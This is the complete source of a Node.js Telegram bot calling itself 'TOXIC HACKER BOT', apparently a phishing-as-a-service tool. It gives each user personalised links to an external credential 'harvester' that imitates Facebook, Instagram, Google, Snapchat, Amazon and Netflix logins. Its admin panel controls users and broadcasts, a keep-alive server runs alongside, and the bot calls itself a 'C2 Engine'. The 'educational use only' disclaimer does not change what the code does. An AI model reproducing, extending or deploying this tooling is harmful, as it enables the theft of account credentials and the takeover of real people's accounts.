const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const http = require('http');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing. Bot cannot start.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions (with Bot Status) ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [], bot_status: 'active' }, null, 2));
    }
    const data = JSON.parse(fs.readFileSync(DB_PATH));
    if (data.bot_status === undefined) {
        data.bot_status = 'active';
        writeDb(data);
    }
    return data;
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (id) => readDb().admins.includes(parseInt(id));

// --- Start Message ---
const startMessage = `
🔥 **TOXIC HACKER BOT**

🔗 *Credential Testing Interfaces:*
 • Facebook
 • Instagram
 • Snapchat
 • Google
 • Amazon

🎯 *For Educational Use Only!*
 ❌ Illegal Use is Prohibited.
 ✅ Ethical Hacking | OSINT | Red Teaming

Join: @ToxicBack2025
`;

// --- KEYBOARDS ---
const createAdminKeyboard = (status) => {
    const maintenanceButtonText = status === 'active' ? "Maintenance Mode: ON 🔴" : "Maintenance Mode: OFF 🟢";
    return Markup.inlineKeyboard([
        [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
        [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
        [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
        [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')],
        [Markup.button.callback(maintenanceButtonText, 'admin_toggle_maintenance')]
    ]);
};

// NAYA FIX: User ke liye alag se saaf-suthra keyboard
const userLinkGenerationKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
    [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')]
]);

const adminLinkGenerationKeyboard = Markup.inlineKeyboard([
    ...userLinkGenerationKeyboard.reply_markup.inline_keyboard,
    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
]);


// --- /start COMMAND ---
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    if (!isAdmin(userId) && db.bot_status === 'maintenance') {
        return ctx.reply('⚠️ **Bot is under maintenance.** Please try again later.');
    }

    try {
        const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error();

        if (!db.users[userId]) {
            db.users[userId] = { username, joinDate: new Date().toISOString() };
            writeDb(db);
            const safeUsername = username.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            ctx.telegram.sendMessage(OWNER_ID, `*New User Joined*\n\\- *User:* ${safeUsername}\n\\- *ID:* \`${userId}\``, { parse_mode: 'MarkdownV2' });
        }

        if (isAdmin(userId)) {
            const adminKeyboard = createAdminKeyboard(db.bot_status);
            await ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
        } else {
            // NAYA FIX: User ko ab hamesha buttons dikhenge
            await ctx.replyWithMarkdown(startMessage, userLinkGenerationKeyboard);
        }
    } catch {
        await ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
            [Markup.button.url('➡️ Join Channel', CHANNEL_LINK)],
            [Markup.button.callback('✅ I Joined', 'check_join')]
        ]));
    }
});

// --- Callback Query Handler ---
bot.on('callback_query', async (ctx) => {
    const userId = ctx.from.id;
    const data = ctx.callbackQuery.data;
    const messageId = ctx.callbackQuery.message.message_id;
    await ctx.answerCbQuery();

    if (data === 'check_join') return ctx.reply("Now please type /start again to verify.");

    const [type, command, service] = data.split('_');

    if (type === 'gen' && command === 'link') {
        const link = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
        return ctx.replyWithMarkdown(`✅ *[${service} Link]*:\n\`${link}\``);
    }

    if (isAdmin(userId) && type === 'admin') {
        let db = readDb();
        if (command === 'toggle' && service === 'maintenance') {
            db.bot_status = db.bot_status === 'active' ? 'maintenance' : 'active';
            writeDb(db);
            const statusMessage = db.bot_status === 'maintenance' ? "Bot is now in MAINTENANCE mode." : "Bot is now ACTIVE.";
            await ctx.answerCbQuery(statusMessage, { show_alert: true });
            const newAdminKeyboard = createAdminKeyboard(db.bot_status);
            return ctx.editMessageText("👑 *Admin Panel*", { parse_mode: 'Markdown', ...newAdminKeyboard });
        }
        
        const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
        if (prompts[command]) {
            adminState[userId] = command;
            return ctx.reply(prompts[command]);
        }

        switch(command) {
            case 'status':
                const totalUsers = Object.keys(db.users).length;
                return ctx.editMessageText(`📊 *Bot Status*\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...createAdminKeyboard(db.bot_status) });
            case 'generate':
                return ctx.editMessageText("🔗 **Admin Link Generator**", adminLinkGenerationKeyboard);
            case 'panel':
                return ctx.editMessageText("👑 **Admin Panel**", { parse_mode: 'Markdown', ...createAdminKeyboard(db.bot_status) });
        }
    }
});

// --- Text Handler ---
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    if (text.startsWith('/') || !adminState[userId] || !isAdmin(userId)) return;

    const db = readDb();
    const action = adminState[userId];
    delete adminState[userId];
    const targetId = parseInt(text);

    switch (action) {
        case 'broadcast':
            ctx.reply("📢 Broadcasting...");
            for (const uid of Object.keys(db.users)) {
                try { await ctx.telegram.sendMessage(uid, text); } catch {}
            }
            return ctx.reply("✅ Broadcast complete.");
        case 'add':
            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
                db.admins.push(targetId); writeDb(db);
                return ctx.reply(`✅ Admin added: ${targetId}`);
            }
            return ctx.reply("❌ Invalid or existing admin.");
        case 'remove':
            if (targetId === parseInt(OWNER_ID)) return ctx.reply("❌ Cannot remove owner.");
            db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
            return ctx.reply(`✅ Removed admin: ${targetId}`);
        case 'block':
            if (isAdmin(targetId)) return ctx.reply("❌ Cannot block admin.");
            if (!db.blocked_users.includes(targetId)) {
                db.blocked_users.push(targetId); writeDb(db);
                return ctx.reply(`🚫 Blocked: ${targetId}`);
            }
            return ctx.reply("⚠️ Already blocked.");
        case 'unblock':
            if (db.blocked_users.includes(targetId)) {
                db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
                return ctx.reply(`✅ Unblocked: ${targetId}`);
            }
            return ctx.reply("❌ ID not found in block list.");
    }
});

// --- "STAY-ALIVE" SERVER ---
const PORT = process.env.PORT || 10000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`Bot is alive. Last check: ${new Date().toISOString()}`);
}).listen(PORT, () => {
    console.log(`Stay-alive server listening on port ${PORT}`);
});

// Launch the bot
bot.launch();
console.log('🔥 Flawless C2 Engine is online.');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
